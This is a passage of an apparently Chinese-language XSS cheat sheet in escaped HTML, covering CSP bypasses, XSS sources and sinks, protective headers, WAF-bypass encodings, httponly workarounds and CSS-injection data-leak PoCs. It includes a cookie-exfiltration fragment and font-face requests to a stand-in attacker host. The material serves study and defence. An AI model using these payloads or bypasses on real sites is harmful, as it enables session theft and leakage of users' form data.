sourceMappingURL=http://xxxx/`+document.cookie+`&amp;lt;\/script&gt;`);``&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;a 标签的 ping 属性&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For FireFox  &lt;code&gt;&amp;lt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;import&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;refresh&amp;quot; content=&amp;quot;0; url=http://....&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;仅限制  &lt;code&gt;script-src&lt;/code&gt;  时：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;object data=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;quot;&amp;gt;&amp;lt;/object&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss数据源&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss数据源&#34;&gt;#&lt;/a&gt; XSS 数据源&lt;/h1&gt;
&lt;h2 id=&#34;url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#url&#34;&gt;#&lt;/a&gt; URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.pathname&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.search&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.hash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.URL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.documentURI&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.baseURI&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;navigation&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#navigation&#34;&gt;#&lt;/a&gt; Navigation&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window.name&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.referrer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;communication&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#communication&#34;&gt;#&lt;/a&gt; Communication&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ajax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Fetch&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;WebSocket&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PostMessage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;storage&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#storage&#34;&gt;#&lt;/a&gt; Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Cookie&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LocalStorage&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SessionStorage&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sink&#34;&gt;#&lt;/a&gt; Sink&lt;/h1&gt;
&lt;h2 id=&#34;执行javascript&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行javascript&#34;&gt;#&lt;/a&gt; 执行 JavaScript&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setTimeout(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setInterval(payload, 100)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Function(payload)()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script&amp;gt;payload&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img src=x onerror=payload&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加载url&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加载url&#34;&gt;#&lt;/a&gt; 加载 URL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;location=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.href=javascript:alert(/xss/)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.assign(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;location.replace(javascript:alert(/xss/))&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;执行html&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#执行html&#34;&gt;#&lt;/a&gt; 执行 HTML&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;xx.innerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xx.outerHTML=payload&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.write(payload)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document.writeln(payload)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;xss保护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护&#34;&gt;#&lt;/a&gt; XSS 保护&lt;/h1&gt;
&lt;h2 id=&#34;html过滤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#html过滤&#34;&gt;#&lt;/a&gt; HTML 过滤&lt;/h2&gt;
&lt;p&gt;使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。&lt;/p&gt;
&lt;h2 id=&#34;x-frame&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#x-frame&#34;&gt;#&lt;/a&gt; X-Frame&lt;/h2&gt;
&lt;p&gt;X-Frame-Options 响应头有三个可选的值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DENY
&lt;ul&gt;
&lt;li&gt;页面不能被嵌入到任何 iframe 或 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SAMEORIGIN
&lt;ul&gt;
&lt;li&gt;页面只能被本站页面嵌入到 iframe 或者 frame 中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ALLOW-FROM
&lt;ul&gt;
&lt;li&gt;页面允许 frame 或 frame 加载&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xss保护头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xss保护头&#34;&gt;#&lt;/a&gt; XSS 保护头&lt;/h2&gt;
&lt;p&gt;基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。&lt;/p&gt;
&lt;p&gt;而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。&lt;/p&gt;
&lt;p&gt;要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  : 表示关闭浏览器的 XSS 防护机制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1; mode=block&lt;/code&gt;  : 如果检测到恶意代码，在不渲染恶意代码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。&lt;/p&gt;
&lt;h1 id=&#34;waf-bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#waf-bypass&#34;&gt;#&lt;/a&gt; WAF Bypass&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;利用 &amp;lt;&amp;gt; 标记&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用 html 属性&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;href&lt;/li&gt;
&lt;li&gt;lowsrc&lt;/li&gt;
&lt;li&gt;bgsound&lt;/li&gt;
&lt;li&gt;background&lt;/li&gt;
&lt;li&gt;value&lt;/li&gt;
&lt;li&gt;action&lt;/li&gt;
&lt;li&gt;dynsrc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用回车拆分&lt;/li&gt;
&lt;li&gt;字符串拼接
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;al&amp;quot; + &amp;quot;ert&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;利用编码绕过&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;base64&lt;/li&gt;
&lt;li&gt;jsfuck&lt;/li&gt;
&lt;li&gt;String.fromCharCode&lt;/li&gt;
&lt;li&gt;HTML&lt;/li&gt;
&lt;li&gt;URL&lt;/li&gt;
&lt;li&gt;hex
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;window[&amp;quot;\x61\x6c\x65\x72\x74&amp;quot;]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;unicode&lt;/li&gt;
&lt;li&gt;utf7
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;+ADw-script+AD4-alert(&#39;XSS&#39;)+ADsAPA-/script+AD4-&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;utf16&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;大小写混淆&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对标签属性值转码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;产生事件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;css 跨站解析&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;长度限制 bypass&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval(name)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;eval(hash)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;import&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.getScript&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用  &lt;code&gt;。&lt;/code&gt;  绕过 IP / 域名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;document[&#39;cookie&#39;]&lt;/code&gt;  绕过属性取值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤引号用  &lt;code&gt;`&lt;/code&gt;  绕过&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#技巧&#34;&gt;#&lt;/a&gt; 技巧&lt;/h1&gt;
&lt;h2 id=&#34;httponly&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#httponly&#34;&gt;#&lt;/a&gt; httponly&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。&lt;/li&gt;
&lt;li&gt;在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie&lt;/li&gt;
&lt;li&gt;部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题&lt;/li&gt;
&lt;li&gt;低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段&lt;/li&gt;
&lt;li&gt;phpinfo 等页面可能会回显信息，这些信息中包含 http 头&lt;/li&gt;
&lt;li&gt;通过 xss 劫持页面钓鱼&lt;/li&gt;
&lt;li&gt;通过 xss 伪造 oauth 等授权请求，远程登录&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;css注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css注入&#34;&gt;#&lt;/a&gt; CSS 注入&lt;/h2&gt;
&lt;h3 id=&#34;基本介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本介绍&#34;&gt;#&lt;/a&gt; 基本介绍&lt;/h3&gt;
&lt;p&gt;CSS 注入最早开始于利用 CSS 中的  &lt;code&gt;expression()&lt;/code&gt;   &lt;code&gt;url()&lt;/code&gt;   &lt;code&gt;regex()&lt;/code&gt;  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;css-selectors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#css-selectors&#34;&gt;#&lt;/a&gt; CSS selectors&lt;/h3&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;a&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;b&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token selector&#34;&gt;#form2 input[value^=&#39;c&#39;]&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token property&#34;&gt;background-image&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://localhost/log.php/c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    [...]&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://example.com&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;form2&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;secret&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;abc&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上图是利用 CSS selectors 完成攻击的一个示例&lt;/p&gt;
&lt;h3 id=&#34;abusing-unicode-range&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#abusing-unicode-range&#34;&gt;#&lt;/a&gt; Abusing Unicode Range&lt;/h3&gt;
&lt;p&gt;当可以插入 CSS 的时候，可以使用  &lt;code&gt;font-face&lt;/code&gt;  配合  &lt;code&gt;unicode-range&lt;/code&gt;  获取目标网页对应字符集。PoC 如下&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;style&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token style&#34;&gt;&lt;span class=&#34;token language-css&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0041&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?B&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* fetched too */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;unicode-range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;U+0042&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token atrule&#34;&gt;&lt;span class=&#34;token rule&#34;&gt;@font-face&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;font-family&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;poc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token property&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token url&#34;&gt;&lt;span class=&#34;token function&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;http://attacker.example.com/?C&lt;span class=&#34;token 